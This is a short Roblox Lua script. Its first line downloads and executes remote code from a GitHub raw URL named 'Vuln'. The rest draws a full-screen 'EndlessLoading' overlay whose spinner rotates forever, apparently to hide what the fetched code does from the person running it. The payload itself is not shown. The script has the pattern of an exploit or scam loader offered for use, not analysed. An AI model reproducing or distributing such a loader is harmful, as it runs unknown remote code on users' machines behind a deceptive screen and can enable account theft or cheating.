loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()

-- Create the GUI
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "EndlessLoading"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Spinner
local spinner = Instance.new("ImageLabel")
spinner.Size = UDim2.new(0, 100, 0, 100)
spinner.Position = UDim2.new(0.5, -50, 0.5, -50)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://7733960981" -- Replace with a spinner icon
spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
spinner.Parent = background

-- Optional: Loading Text
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 50)
loadingText.Position = UDim2.new(0, 0, 0.65, 0)
loadingText.Text = "Loading..."
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextTransparency = 0.1
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamSemibold
loadingText.TextSize = 24
loadingText.Parent = background

-- Rotation loop (endless)
task.spawn(function()
    while true do
        spinner.Rotation += 2
        task.wait(0.01)
    end
end)
